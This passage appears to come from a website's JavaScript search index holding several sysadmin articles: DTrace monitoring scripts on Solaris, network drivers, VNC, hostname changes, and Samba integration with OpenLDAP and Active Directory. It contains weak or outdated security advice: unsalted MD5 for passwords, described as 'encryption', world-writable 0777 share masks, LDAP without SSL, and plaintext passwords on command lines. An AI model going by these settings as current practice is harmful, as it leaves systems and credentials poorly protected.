fspaging.d, you can get a detailed view of which files are being accessed:\n$ fspaging.d Event Device Path RW Size Offset get-page /lib/sparcv9/libc.so.1 8192 get-page /usr/lib/sparcv9/libdtrace.so.1 8192 get-page /lib/sparcv9/libc.so.1 8192 get-page /lib/libc.so.1 8192 put-page /etc/svc/volatile/system-system-log:default.log 8192 put-page /etc/svc/volatile/svc_nonpersist.db 8192 put-page /etc/svc/volatile/svc_nonpersist.db 8192 put-page /etc/svc/volatile/init-next.state 8192 put-page /etc/svc/volatile/network-ssh:default.log 8192 put-page /etc/svc/volatile/network-pfil:default.log 8192 This is a super useful script! Niiiiiiiiiiice!\nGetting System Wide errno Information linkWhen system calls have problems executing, they usually return a value to indicate success or failure, and set the global “ERRNO” variable to a value indicating what went wrong. To get a system-wide view of which system calls are erroring out, we can use Brendan Gregg’s errinfo D script:\n$ errinfo -c Sampling... Hit Ctrl-C to end. ^C EXEC SYSCALL ERR COUNT DESC ttymon read 11 1 Resource temporarily unavailable utmpd ioctl 25 2 Inappropriate ioctl for device init ioctl 25 4 Inappropriate ioctl for device nscd lwp_kill 3 13 No such process fmd lwp_park 62 48 timer expired nscd lwp_park 62 48 timer expired svc.startd lwp_park 62 48 timer expired vxesd accept 4 49 interrupted system call svc.configd lwp_park 62 49 timer expired inetd lwp_park 62 49 timer expired svc.startd portfs 62 490 timer expired This will display the process, system call, and errno number and description from /usr/src/sys/errno.h! Jeah!\nI/O per Process linkSeveral Solaris utilities provide a summary of the time spent waiting for I/O (which is a meaningless metric), but fail to provide facilities to easily correlate I/O activity with a process. With the introduction of psio.pl, you can see exactly which processes are responsible for generating I/O:\n$ psio.pl UID PID PPID %I/O STIME TTY TIME CMD root 7312 7309 70.6 16:00:59 pts/2 02:36 dd if=/dev/dsk/c1t1d0s2 of=/dev/null bs=1048576 root 0 0 0.0 10:24:18 ? 00:02 sched root 1 0 0.0 10:24:18 ? 00:03 /sbin/init root 2 0 0.0 10:24:18 ? 00:00 pageout root 3 0 0.0 10:24:18 ? 00:51 fsflush root 7 1 0.0 10:24:20 ? 00:06 /lib/svc/bin/svc.startd root 9 1 0.0 10:24:21 ? 00:14 /lib/svc/bin/svc.configd Once you find I/O intensive processes, you can use fspaging, iosnoop, and rwsnoop to get additional information:\n$ iosnoop -n MAJ MIN UID PID D BLOCK SIZE COMM PATHNAME 136 8 0 990 R 341632 8192 dtrace /lib/sparcv9/ld.so.1 136 8 0 990 R 341568 8192 dtrace /lib/sparcv9/ld.so.1 136 8 0 990 R 14218976 8192 dtrace /lib/sparcv9/libc.so.1 [ ... ] $ iosnoop -e DEVICE UID PID D BLOCK SIZE COMM PATHNAME dad1 0 404 R 481712 8192 vxsvc /lib/librt.so.1 dad1 0 3 W 516320 3072 fsflush /var/adm/utmpx dad1 0 3 W 18035712 8192 fsflush /var/adm/wtmpx [ ... ] $ rwsnoop UID PID CMD D BYTES FILE 100 902 sshd R 42 /devices/pseudo/clone@0:ptm 100 902 sshd W 80 100 902 sshd R 65 /devices/pseudo/clone@0:ptm 100 902 sshd W 112 100 902 sshd R 47 /devices/pseudo/clone@0:ptm 100 902 sshd W 96 0 404 vxsvc R 1024 /etc/inet/protocols [ ... ] Smooooooooooth!\nI/O Sizes Per Process linkAs a Solaris administrator, we are often asked to identify application I/O sizes. This information can be acquired for a single process with truss(1m), or system wide with Brendan Gregg’s bitesize.d D script:\n$ bitesize.d Sampling... Hit Ctrl-C to end. 3 fsflush value ------------- Distribution ------------- count 512 | 0 1024 |@ 1 2048 | 0 4096 |@@ 2 8192 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 39 16384 | 0 7312 dd if=/dev/dsk/c1t1d0s2 of=/dev/null bs=1048576 value ------------- Distribution ------------- count 16 | 0 32 | 2 64 | 0 128 | 0 256 | 0 512 | 2 1024 | 0 2048 | 0 4096 | 0 8192 | 0 16384 | 0 32768 | 0 65536 | 0 131072 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 76947 262144 | 0 If only Dorothy could see this!\nTCP Top linkSnoop(1m) and ethereal are amazing utilities, and provide a slew of options to filter data. When you don’t have time to wade through snoop data or download and install ethereal, you can use tcptop to get an overview of TCP activity on a system:\n$ tcptop 5 2005 Jul 19 14:09:06, load: 0.01, TCPin: 2679 Kb, TCPout: 12 Kb UID PID LADDR LPORT RADDR RPORT SIZE NAME 0 7138 192.168.1.3 44084 192.18.108.40 21 544 ftp 0 352 192.168.1.3 22 192.168.1.8 49805 1308 sshd 100 7134 192.168.1.3 44077 192.168.1.1 22 1618 ssh 0 7138 192.168.1.3 44089 24.98.83.96 51731 2877524 ftp Now this is some serious bling!\nWho’s Paging and DTrace Enhanced vmstat linkWith Solaris 9, the “-p” option was added to vmstat to break paging activity up into “executable,” “anonymous” and “filesystem” page types:\n$ vmstat -p 5 memory page executable anonymous filesystem swap free re mf fr de sr epi epo epf api apo apf fpi fpo fpf 1738152 832320 5 9 0 0 0 0 0 0 0 0 0 1 0 0 1683280 818800 0 2 0 0 0 0 0 0 0 0 0 0 0 0 1683280 818800 0 0 0 0 0 0 0 0 0 0 0 0 0 0 This was super useful information, but unfortunately doesn’t provide the executable responsible for the paging activity. With the introduction of whospaging.d, you can get paging activity per process:\n$ whospaging.d Who's waiting for pagein (milliseconds): Who's on cpu (milliseconds): svc.configd 0 sendmail 0 svc.startd 0 sshd 0 nscd 1 dtrace 3 fsflush 14 dd 1581 sched 3284 Once we get the process name that is responsible for the paging activity, we can use dvmstat to break down the types of pages the application is paging (similar to vmstat -p, but per process!):\n$ dvmstat -p 0 re maj mf fr epi epo api apo fpi fpo sy 0 0 0 13280 0 0 0 0 0 13280 0 0 0 0 13504 0 0 0 0 0 13504 0 0 0 0 13472 0 0 0 0 0 13472 0 0 0 0 13472 0 0 0 0 0 13472 0 0 0 0 13248 0 0 0 0 0 13248 0 0 0 0 13376 0 0 0 0 0 13376 0 0 0 0 13664 0 0 0 0 0 13664 0 Once we have an idea of which pages are being paged in or out, we can use iosnoop, rwsnoop and fspaging.d to find out which files or devices the application is writing to! Since these rockin’ scripts go hand in hand, I am placing them together. Shizam!\nAnd without further ado, number 1 goes to … (drum roll)\nI/O Top linkAfter careful thought, I decided to make iotop and rwtop #1 on my top ten list. I have long dreamed of a utility that could tell me which applications were actively generating I/O to a given file, device or file system. With the introduction of iotop and rwtop, my wish came true:\n$ iotop 5 2005 Jul 19 13:33:15, load: 0.24, disk_r: 95389 Kb, disk_w: 0 Kb UID PID PPID CMD DEVICE MAJ MIN D BYTES 0 99 1 nscd dad1 136 8 R 16384 0 7037 7033 find dad1 136 8 R 2266112 0 7036 7033 dd sd7 32 58 R 15794176 0 7036 7033 dd sd6 32 50 R 15826944 0 7036 7033 dd sd5 32 42 R 15826944 0 7036 7033 dd vxio21000 100 21000 R 47448064 $ rwtop 5 2005 Jul 24 10:47:26, load: 0.18, app_r: 9 Kb, app_w: 8 Kb UID PID PPID CMD D BYTES 100 922 920 bash R 3 100 922 920 bash W 15 100 902 899 sshd R 1223 100 926 922 ls R 1267 100 902 899 sshd W 1344 100 926 922 ls W 2742 100 920 917 sshd R 2946 100 920 917 sshd W 4819 0 404 1 vxsvc R 5120 References linkhttp://brendangregg.com/\nDTrace User Guide\nObserving I/O Behavior with the DTraceToolkit\nDTrace Toolkit\nDTrace Topics\nDtrace GUI linkhttp://www.netbeans.org/kb/docs/ide/NetBeans_DTrace_GUI_Plugin_0_4.html\n"
            }
        );
    index.add(
            {
                id:  583 ,
                href: "\/make-unsupported-network-cards-work-with-solaris\/",
                title: "Make Unsupported Network Cards Work with Solaris",
                description: "How to make unsupported network cards work with Solaris by installing additional drivers",
                content: "Introduction linkI recently faced an issue with network card recognition for my home server. I have two D-Link DGE-530T gigabit network cards, and unfortunately, they don’t work out of the box with Solaris. No need to panic though - as the drivers exist under BSD license, they have been ported and some even packaged.\nThis was my case for these DLINK cards. I’ll share the approach I followed to get my two cards working, and I’ll provide reference links in case you have other network cards that need to be recognized.\nInstallation linkFirst, let’s remove the old package containing the drivers:\npkgrm SK98sol Next, we’ll check if there are any driver aliases and then remove them if they exist:\ngrep sk98 /etc/driver_aliases Remove all the lines that appear from this command.\nNow, let’s proceed with installing the driver. Download the version corresponding to your architecture of the D-Link driver, then decompress and install the package:\ngtar -xzvf skge*.tar.Z pkgadd -d . SKGEsol Follow the instructions. At the end, update the list so that updated aliases are created:\nupdate_drv -a -i \"pci1186,4b01\" skge Finally, we need to make the hardware detected at boot:\ntouch /reconfigure All that’s left is to reboot the machine and you’re good to go :-)\nFAQ linkI have problems with VirtualBox recognizing my card, why? linkIn the VirtualBox logs, you might find something like:\nvboxflt:vboxNetFltSolarisOpenStream Failed to open '/dev/skge0' rc=19 pszName='skge0' And that’s the problem - in /dev/, there’s only skge and not skge0 as indicated in /etc/hostname.skge0.\nUnfortunately, I didn’t find a quick solution. I preferred to change the network card instead. Sorry for those who were hoping to find a solution to this problem.\nReferences link List of network cards and additional drivers for Solaris https://www.sun.com/bigadmin/hcl/data/components/details/2729.html https://www.skd.de/e_en/support/driver_searchresults.html?navanchor=10013\u0026term=typ.treiber+bs.SUN_Solaris+produkt.SK-9821V2.0\u0026produkt=produkt.SK-9821V2.0\u0026typ=typ.treiber\u0026system=bs.SUN_Solaris "
            }
        );
    index.add(
            {
                id:  584 ,
                href: "\/R%C3%A9solution_noms_DNS_FQDN_en_local\/",
                title: "DNS FQDN Name Resolution in Local Network",
                description: "How to solve DNS FQDN name resolution issues on Ubuntu systems by modifying the nsswitch.conf file.",
                content: "Problem linkYou may have noticed that on Ubuntu, there is a problem resolving FQDN (Fully Qualified Domain Names) for your local DNS servers.\nSolution linkSimply edit the /etc/nsswitch.conf file and replace this line:\nhosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 With:\nhosts: files dns mdns4 And just like magic, everything works! :-)\n"
            }
        );
    index.add(
            {
                id:  585 ,
                href: "\/Crypter_un_mot_de_passe_en_MD5\/",
                title: "Encrypting a Password with MD5",
                description: "Learn how to encrypt passwords using MD5 hash and check file integrity on Linux and Solaris systems.",
                content: "Introduction linkMD5 hashing allows you to verify the integrity of a file. In short, it creates a fingerprint that helps you verify (after a transfer, for example) whether the file arrived correctly and is not corrupted.\nToday, MD5 encryption has been broken, and it’s possible to simulate a fake fingerprint. Therefore, you should be careful about how you use it. Personally, I use it to verify the integrity of downloaded files (as it’s a very common method). For example, when I download Sun Cluster, I verify the MD5 hash to ensure the installation is complete and not corrupted.\nObtaining an MD5 Hash linkA Word linkTo encrypt a password in MD5, it’s not very complicated, but when you don’t do it every day, you might not remember how. So here it is:\necho -n password | md5sum A File on Linux linkOn Linux, the md5sum command is used:\nmd5sum /bin/ls c854f8350b2a2873d4c2635813a797cc /bin/ls A File on Solaris linkOn Solaris, we’ll use the digest command to calculate the MD5 hash:\n$ digest -a md5 -v /bin/ls md5 (/bin/ls) = b57e173220af4b919f1d4bef9db11482 "
            }
        );
    index.add(
            {
                id:  586 ,
                href: "\/Changer_le_hostname_de_sa_solaris\/",
                title: "Changing Hostname on Solaris",
                description: "How to change the hostname on Solaris systems both temporarily and permanently without requiring a reboot.",
                content: "Introduction linkWhile there are things about Solaris that can be frustrating, this is one aspect where it’s impressive! You don’t need to restart your machine to change the hostname - it updates live. I have to admit that’s pretty cool.\nTemporary Method linkHere’s the temporary method (which will be lost after reboot):\nhostname machine_name And to verify:\nhostname Manual Method linkThe method provided here doesn’t use any utilities.\nEdit the following files and modify the HOSTNAME value:\n/etc/inet/hosts /etc/net/ticlts/hosts /etc/net/ticots/hosts /etc/net/ticotsord/hosts /etc/nodename /etc/hostname.[identifier of the interface that associates the IP address with the HOSTNAME] Then go to /var/crash and rename the directory:\ncd /var/crash mv oldname newname All that’s left is to restart.\nIn the case of a cluster, modify these files (except if the cluster is not yet configured on this machine):\n/etc/cluster/nodeid "
            }
        );
    index.add(
            {
                id:  587 ,
                href: "\/Mise_en_place_de_vncserver_sur_Solaris\/",
                title: "Setting up VNC server on Solaris",
                description: "This guide explains how to install and configure VNC Server on Solaris systems to enable remote desktop access.",
                content: "Introduction linkSolaris, my love! You who never have packages and are never very convenient to use! In short, my difficult love! And yes, VNC server is doable! Recompiling manually is too difficult and time-consuming, so I opted for packages. But even that isn’t all roses!\nInstallation linkMethod 1 linkAdd this line to your profile:\nPATH=$PATH:/usr/openwin/bin:/usr/X11/bin Method 2 linkFor prerequisites, you need pkg-get! Then let’s get started:\npkg-get -i vncserver Let’s refine things by editing /etc/init.d/boot.server and adding the magic line:\ntest -d /tmp/.X11-unix \u0026\u0026 /usr/bin/chmod 1777 /tmp/.X11-unix This line allows all users to access vncserver from boot.\nThat’s it! Now you just need to launch it.\nConfiguration linkWe’ll start vncserver once, then kill it to get the configuration. Also enter the password when prompted:\n$ vncserver You will require a password to access your desktops. Password: Verify: New 'unknown:1 (root)' desktop is unknown:1 Creating default startup script //.vnc/xstartup Starting applications specified in //.vnc/xstartup Log file is //.vnc/unknown:1.log vncserver -kill :1 Now we can edit the ~/.vnc/xstartup file for all users:\n#!/bin/sh [ -r $HOME/.Xresources ] \u0026\u0026 xrdb $HOME/.Xresources xsetroot -solid grey #vncconfig -iconic \u0026 #xterm -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" \u0026 gnome-session \u0026 Launching linkLet’s start vncserver and we’re good to go!\n$ vncserver "
            }
        );
    index.add(
            {
                id:  588 ,
                href: "\/Installation_et_configuration_de_Samba_en_mode_%22User%22_%28Authentification_sur_un_serveur_OpenLDAP%29\/",
                title: "Installation and Configuration of Samba in User Mode (Authentication on an OpenLDAP Server)",
                description: "This guide explains how to install and configure Samba in user mode with authentication on an OpenLDAP server for secure file sharing between Linux and Windows environments.",
                content: "Introduction linkSamba is free software under the GPL license that supports the SMB/CIFS protocol. This protocol is used by Microsoft for sharing various resources (files, printers, etc.) between computers running Windows. Samba allows Unix systems to access resources on these systems and vice versa.\nPreviously, PCs running DOS and early Windows versions sometimes had to install a TCP/IP stack and a set of Unix-origin software: an NFS client, FTP, telnet, lpr, etc. This was cumbersome and penalizing for the PCs of that time, and it also forced their users to develop a double set of habits, adding Unix habits to those of Windows. Samba therefore adopts the opposite approach.\nIts name comes from the file and print sharing protocol from IBM, reused by Microsoft, called SMB (Server message block), to which the two vowels ‘a’ were added: “SaMBa”.\nSamba was originally developed by Andrew Tridgell starting in 1991, and today receives contributions from about twenty developers from around the world under his coordination. He gave it this name by choosing a name similar to SMB by querying a Unix dictionary with the grep command: grep \"^s.*m.*b\" /usr/dict/words\nWhen both file sharing systems (NFS, Samba) are installed for comparison, Samba proves less efficient than NFS in terms of transfer rates.\nNevertheless, a study has shown that Samba 3 was up to 2.5 times faster than the SMB implementation of Windows Server 2003. See information on LinuxFr.\nHowever, Samba is not compatible with IPv6.\nThe “ADS” mode allows you to use an OpenLDAP server to authenticate users for accessing Samba shares. This solution is quite complex to implement but ensures increased security (authentication via Kerberos) for your server.\nNotes: It is imperative to have implemented NT-type ACLs before continuing.\nTo help you with this documentation, you can also consult: Installation and Configuration of Samba in ADS Mode (Authentication on an AD Server)\nInformation linkTo access shared resources (SMB/CIFS) of the Windows domain, a Samba installation is required on the Linux server that will primarily play the role of an SMB/CIFS client.\nSamba will also allow, using MSRPC commands, to communicate with the LDAP server to perform various operations: adding information about the Linux server in the directory, listing user accounts/groups, transmitting authentication requests…\nThe server will run in standalone mode, with user or share security mode. With this mode, users are required to authenticate when they access a share. Samba can authenticate and manage file permissions using accounts and passwords stored in the LDAP directory.\nSamba linkInstallation linkTo install Samba:\napt-get install samba smbclient Configuration linkTo configure Samba, edit the /etc/samba/smb.conf file:\nSamba link #======================= Global Settings ======================= [global] workgroup = mydomain server string = %h server dns proxy = no #### Debugging/Accounting #### log file = /var/log/samba/log.%m max log size = 1000 syslog = 0 panic action = /usr/share/samba/panic-action %d ####### Authentication ####### security = user encrypt passwords = true obey pam restrictions = yes guest account = Invite invalid users = root unix password sync = yes passwd program = /usr/bin/passwd %u passwd chat = *Enter\\snew\\sUNIX\\spassword:* %n\\n *Retype\\snew\\sUNIX\\spassword:* %n\\n *password\\supdated\\ssuccessfully* . pam password change = yes passdb backend = ldapsam:ldap://myLDAP_IP_Server/ ldap suffix = dc=openldap,dc=mydomain,dc=local ldap machine suffix = ou=Computers ldap idmap suffix = ldap user suffix = ldap group suffix = ldap admin dn = \"cn=admin,dc=openldap,dc=mydomain,dc=local\" ldap passwd sync = yes ldap ssl = no idmap backend = ldap:ldap://ldap.mydomain.local idmap uid = 40000-60000 idmap gid = 40000-60000 winbind use default domain = Yes winbind trusted domains only = yes ############ Misc ############ socket options = TCP_NODELAY unix extensions = yes case sensitive = yes delete readonly = yes ea support = yes ### ACL SUPPORT ### nt acl support = yes acl compatibility = auto acl check permissions = yes acl group control = yes #======================= Share Definitions ======================= [Homes] comment = Home Directories browseable = yes read only = no writable = yes create mask = 0700 directory mask = 0700 dos filemode = yes inherit acls = yes inherit permissions = yes Adapt all this for your configuration. Then restart Samba:\n/etc/init.d/samba restart Integration linkSamba linkNext, we need to set the LDAP password otherwise we will get an error like:\nldap_connect_system: Failed to retrieve password from secrets.tdb Let’s use the smbpasswd command to create the /var/lib/samba/secrets.tdb file:\n$ smbpasswd -w 'mypassowd' Setting stored password for \"cn=admin,dc=openldap,dc=mydomain,dc=local\" in secrets.tdb You can verify using the smbpasswd command. If it asks you for a password, enter it, that means it’s working. Otherwise you can try deleting /var/lib/samba/secrets.tdb and retry the process.\nOpenLDAP linkIf you are in LDAP mode, you need to get your SSID on the Samba server:\nnet getlocalsid SID for domain MOONLIGHT is: S-1-5-21-2096052081-3008433157-1548381139-1339 If you cannot connect after that, check the logs, you should get something like this:\nUser pmavro with invalid SID S-1-5-21-2096052081-3008433157-1548381139-1319 in passdb You should then check on the OpenLDAP server how it sees the Samba server (which has normally self-registered). You may then have the same bug as me, which is a different sambaSID (notably truncated). Two solutions are available:\nSolution 1: Modify your sambaSID on your machine so that it is the same as on the server:\nnet setlocalsid S-1-5-21-2096052081-3008433157-1548381139 Solution 2: Modify on the OpenLDAP server the sambaSID field of the samba server (field ‘sambaDomainName’) so that it exactly matches the sambaSID via the “net getlocalsid” command.\nActive Directory linkWe will need Winbind for this to work:\napt-get install winbind And register your machine in the domain:\nwbinfo --set-auth-user='Administrator%HisPassword' WARNING: The SID of the machine running samba must be equal to the SID of the domain. To check, run the commands below:\nnet getlocalsid net getdomainsid They must return the same value!\nIf this is not the case, copy the value returned by ’net getdomainsid’ and do:\nnet setlocalsid new_SID_value Check again and if the values are still different, directly modify the SID of the machine in the LDAP directory.\nResources link Samba topics Documentation on Samba and OpenLDAP installation "
            }
        );
    index.add(
            {
                id:  589 ,
                href: "\/Installation_et_configuration_de_Samba_en_mode_%22ADS%22_%28Authentification_sur_un_serveur_AD%29\/",
                title: "Installation and Configuration of Samba in ADS Mode (Authentication on an AD Server)",
                description: "Guide on how to integrate a Linux server with Samba into an Active Directory domain for unified authentication",
                content: "Introduction linkSamba is free software under GPL license supporting the SMB/CIFS protocol. This protocol is used by Microsoft for sharing various resources (files, printers, etc.) between computers running Windows. Samba allows Unix systems to access the resources of these systems and vice-versa.\nPreviously, PCs equipped with DOS and early Windows versions sometimes had to install a TCP/IP stack and a set of Unix-originated software: NFS client, FTP, telnet, lpr, etc. This was heavy and penalizing for the PCs of that time, and it also forced their users to adopt dual habits, adding those of UNIX to those of Windows. Samba therefore adopts the opposite approach.\nIts name comes from the file and print sharing protocol from IBM and reused by Microsoft called SMB (Server message block), to which were added the two vowels a: “SaMBa”.\nSamba was originally developed by Andrew Tridgell in 1991 and today receives contributions from about twenty developers from around the world under his coordination. He gave it this name by choosing a name close to SMB by querying a Unix dictionary with the grep command:\ngrep \"^s.*m.*b\" /usr/dict/words When the two file sharing systems (NFS, Samba) are installed for comparison, Samba proves less efficient than NFS in terms of transfer rates.\nNevertheless, a study has shown that Samba 3 was up to 2.5 times faster than the SMB implementation of Windows Server 2003. See the information on LinuxFr.\nHowever, Samba is not compatible with IPv6.\nThe “ADS” mode allows using an LDAP server on a MS Windows AD (Active Directory) to authenticate users for accessing Samba shares. This solution is quite complex to implement but ensures increased security (authentication via Kerberos) for your server.\nNote: It is imperative to have set up ACL: Implementation of NT-type rights before continuing.\nActive Directory is at the heart of Microsoft Windows systems; it is in charge of managing user accounts, authentications, but also a large number of information about machines.\nActive Directory relies on different network protocols:\nDNS (name resolution) LDAP (directory querying) Kerberos V (authentication, ticket distribution) NTP (date and time synchronization of machines) SMB/CIFS (resource sharing) Introduction to UNIX User Management linkThe management of LINUX user accounts is carried out using different components in accordance with UNIX philosophy (a program does one thing and does it well). Among these different actors, we find:\nPAM (Pluggable Authentication Modules) allows, among other things, to select different authentication procedures and sources (e.g.: Authentication by smart cards, Databases, Directories…).\nNSS (Name Services Switch) allows Unix to provide correspondence services between names of all kinds (machine names and user names) and the identifiers of these same objects for the machine (IP addresses and uid/gid) using various sources (Files, Directories…).\nIntegration of a Samba Server into an Active Directory Domain linkIntegrating a Samba server into an Active Directory domain requires configuring a Kerberos client on the Samba machine. Kerberos is an authentication system that allows servers to authenticate users and communicate securely. In order to achieve the integration of the LINUX server to the AD domain, additional components are required.\nKerberos linkIt is necessary to configure a Kerberos client to validate the identity of the LINUX server in the Microsoft network. This will communicate with the AD server to make “ticket” requests to the KDC which will be used to ensure the authenticity and security of communications.\nTime Synchronization linkFirst, we need to ensure that our AD and our Samba server are at the same time. For this, we just need to synchronize the time with an NTP server:\napt-get install ntpdate ntpdate ntp.ciril.fr Installing the Kerberos Client linkNow we need to install Kerberos authentication:\napt-get install krb5-clients krb5-user Configuring the Kerberos Client linkPlease edit the /etc/krb5.conf file:\n[libdefaults] default_realm = EXAMPLE.COM [realms] EXAMPLE.COM = { kdc = ad.example.com admin_server = ad.example.com } [domain_realms] .example.com = EXAMPLE.COM Here are the correspondences:\nIMPORTANT: It is imperative to respect the case for all names.\nEXAMPLE.COM: DNS name of the AD ad.example.com: FQDN Verification of the Kerberos Connection link kinit Administrateur@EXAMPLE.COM klist kdestroy Samba linkTo access shared resources (SMB/CIFS) of the Windows domain, a Samba installation is required on the Linux server which will mainly play the role of an SMB/CIFS client.\nSamba will also use MSRPC commands to communicate with the AD server to perform various operations: adding information about the LINUX server in the directory, listing user/group accounts, transmitting authentication requests…\nInstallation linkTo install Samba:\napt-get install samba smbclient Configuration linkTo configure Samba, edit the /etc/samba/smb.conf file:\n#======================= Global Settings ===================================== [global] server string = Samba # Samba server name socket options = TCP_NODELAY SO_RCVBUF=8192 SO_SNDBUF=8192 # Socket optimization realm = EXAMPLE.COM # Kerberos REALM workgroup = workgroup # Domain name os level = 80 # Samba server level ## Restrictions ## hosts deny = ALL # Deny everyone hosts allow = 192.168.0.0/255.255.255.0 127.0.0.1 10.8.0.0/255.255.255.0 # Allow only requests from these IPs bind interfaces only = yes interfaces = eth0 # Allow only requests from this network interface ## Encoding ## European display with accents dos charset = 850 display charset = UTF8 ## Name resolution ## Name resolutions dns proxy = no wins support = no name resolve order = lmhosts host wins bcast ## Logs ## max log size = 50 log file = /var/log/samba/%m.log syslog only = no syslog = 0 panic action = /usr/share/samba/panic-action %d ## Passwords ## security = ADS # Active Directory Server manages the security of shared resources encrypt passwords = true # Active Directory doesn't accept clear passwords unix password sync = no passwd program = /usr/bin/passwd %u passwd chat = *Enter\\snew\\sUNIX\\spassword:* %n\\n *Retype\\snew\\sUNIX\\spassword:* %n\\n . invalid users = root # Don't authorize these users. ## Restrictions ## hide special files = no # Hide special files hide unreadable = no # Hide unreadable files hide dot files = no # Hide hidden files (starting with a \".\") ## Resolve office save problems ## oplocks = no # Resolves compatibility issues with versions \u003e MS Office 2002 ## ACL SUPPORT ## nt acl support = yes acl compatibility = auto acl check permissions = yes acl group control = yes #======================= Share Definitions ======================= [Homes] comment = Home Directories browseable = yes # Allows browsing a directory tree read only = no # Not read-only writable = yes # Allows writing create mask = 0777 # Permissions for file creation directory mask = 0777 # Permissions for directory creation veto files = /.DS_Store/.fuse_*/ # Don't display objects: \".DS_Store\" and \".fuse_*\" dos filemode = yes inherit acls = yes inherit permissions = yes [netlogon] comment = Network Logon Service path = /mnt/test read only = no dos filemode = yes inherit acls = yes inherit permissions = yes browseable = yes writable = yes create mask = 0777 directory mask = 0777 valid users = @\"EXAMPLE.TEST+users\" admin users = @\"EXAMPLE.TEST+administrators\" [Sauvegardes] comment = Sauvegardes path = /saves # Share folder browseable = yes writable = yes veto files = /.DS_Store/.fuse_*/ Adapt all this to your configuration. Then restart Samba:\n/etc/init.d/samba restart Creating the Machine Account for the Samba Server in Active Directory linkThis will add the Samba machine to AD:\nnet ads join -U Administrateur (to exit 'net ads leave') Verification of Access via Kerberos to the Shared Resources of the “AD” Server link kinit Administrateur@EXAMPLE.COM smbclient -L //AD -k kdestroy Verification of “Mounting” a Shared Resource link mkdir /mnt/test mount -t cifs -o username=Administrateur //ad/Public /mnt/test Also see the commands:\nnet ads info and\nnet ads status -U Administrateur Unified Authentication UNIX / Windows linkThe Winbind component of Samba helps solve unified authentication problems. It mainly allows, with the help of PAM (Pluggable Authentication Modules) and NSS (Name Service Switch), to make Windows domain users appear as UNIX accounts.\nInstallation link apt-get install winbind Configuration linkThe configuration of Winbind is done in the Samba configuration file. So edit /etc/samba/smb.conf:\n## Integration Winbind in AD ## idmap uid = 10000-20000 # Correspondences of uids between the Linux server and Active Directory idmap gid = 10000-20000 # Correspondences of gids between the Linux server and Active Directory winbind enum users = yes # List users at Winbind startup winbind enum groups = yes # List groups at Winbind startup winbind separator = + # Domain/username separation character (ex: DOMAIN+user) winbind use default domain = yes # If the domain is not specified, use the default one template shell = /bin/bash # Default shell template homedir = /home/win2k3/%D/%U # Default home directory Verification of Winbind Functionality linkAdapt all this to your configuration. Then restart Samba and Winbind:\n/etc/init.d/samba restart /etc/init.d/winbind restart User account query: wbinfo -u Group query: wbinfo -g Adding Winbind Support to NSS linkEdit the /etc/nsswitch.conf file:\npasswd: compat winbind group: compat winbind Adapt these lines to your configuration.\nVerification of NSS+Winbind Functionality linkThis should display a mix between your local user configuration (/etc/passwd), groups (/etc/group) and accounts in the AD:\ngetent passwd getent group Adding Winbind Support to PAM linkDebian linkFor all of the following, adapt to your configuration. Edit /etc/pam.d/common-auth:\nauth sufficient pam_winbind.so auth required pam_unix.so nullok_secure Then edit /etc/pam.d/common-account:\naccount sufficient pam_winbind.so account required pam_unix.so Now edit /etc/pam.d/common-session:\nsession required pam_unix.so session required pam_mkhomedir.so skel=/etc/skel/ umask=0077 If you don’t have these files, it is possible that everything is in /etc/pam.d/system-auth.\nRed-Hat linkFor all of the following, adapt to your configuration. Edit /etc/pam.d/login:\nauth required pam_securetty.so auth sufficient pam_winbind.so auth sufficient pam_unix.so use_first_pass auth required pam_stack.so service=system-auth auth required pam_nologin.so account sufficient pam_winbind.so account required pam_stack.so service=system-auth password required pam_stack.so service=system-auth session required pam_stack.so service=system-auth session optional pam_console.so Verification of PAM+Winbind Authentication linkLet’s create a folder:\nmkdir -p /home/win2k3/EXAMPLE0 It is possible to log in on a console with an account declared in AD:\n1st time try to authenticate on the AD. 2nd password for the local system. You can also do an ssh, but first, you need to restart the service:\n/etc/init.d/ssh restart ssh Administrateur@localhost No need to create POSIX or Samba accounts for shares anymore:\n/etc/init.d/samba restart smbclient -L localhost -U utilisateurAD Connection linkWindows linkTo connect from Windows, in a link window, type this:\n\\\\IP_of_samba_server\\Share_name You will directly access the share\nUnix (Linux/Mac…) linkYou must have smbfs installed before continuing:\napt-get install smbfs Then, just create a folder and mount the share in it:\nmkdir saves mount -t cifs -o username=user,password=password //192.168.0.1/saves ./saves References linkSamba: https://www.samba.org\nADS Documentation\nSamba ADS on CentOS Documentation\n"
            }
        );
    index.add(
            {
                id:  590 ,
                href: "\/Comprendre_le_fonctionnement_du_Load_Average\/",
                title: "Understanding Load Average",
                description: "A comprehensive guide to understanding how Load Average works in Unix systems and how to properly interpret its values",
                content: "Introduction linkThe load average refers, in UNIX systems, to an average of the system load, a measure of the amount of work the system is doing during the considered period. This is available via the top or uptime commands.\nFor any system administrator, it is very important to understand how load average works in order to know the state of your servers.\nLoad Average acts on these elements:\nCPU RAM Network Disks Number of processes etc… It’s important to understand that Load Average is a general indicator of the system.\nIt allows you to quickly know the state of a system without having to check everything manually. However, it will not tell us about the nature of the problem; we’ll need to fix that manually or use other tools to discover the cause of a high Load Average.\nLoad Average linkYou can get the Load Average via the Top command, uptime or in the file /proc/loadavg. For example:\n09:35:44 up 1:13, 2 users, load average: 0.42, 0.27, 0.32 Some myths persist around this indicator, such as the fact that it should always be less than 1 or less than the number of available CPUs. But in practice, you’ll form your own opinion.\nDefinition linkThe 3 figures represent the average number (in the sense of a time-weighted average) of processes in a state of execution or waiting for a resource during the last 1, 5 and 15 minutes:\n1 min 5 min 15 min 0.42 0.27 0.32 Since this isn’t obvious for everyone, let’s recall a few concepts. Take a process for example, it can:\nBe running Be waiting for a resource (CPU or disk) Be doing nothing For the calculation of Load Average, only the first two cases are taken into account.\nThe kernel regularly counts the number of processes that are working and updates its averages. This calculation is done every 5HZ kernel time intervals. HZ being a value in the kernel that defines the system’s time unit. It is defined as 1/HZ (default value at 100 on x86 architectures) of seconds.\nThe load average variables being updated every 5HZ intervals, this gives every 5 seconds. For tickless systems, this is still valid. The kernel provides, to the function calculating the averages, the number of ticks that would have elapsed in the case of a standard kernel.\nLet’s now look at weighted averages. Without going into details, let’s say that this calculation method gives more weight to the latest values compared to the oldest ones. The decay of the weight of old values is actually exponentially decreasing.\nExample Curve linkFor example, in the curve below, we see the evolution of the load average over time. 2 processes were launched and then killed.\nWe see that the values did not 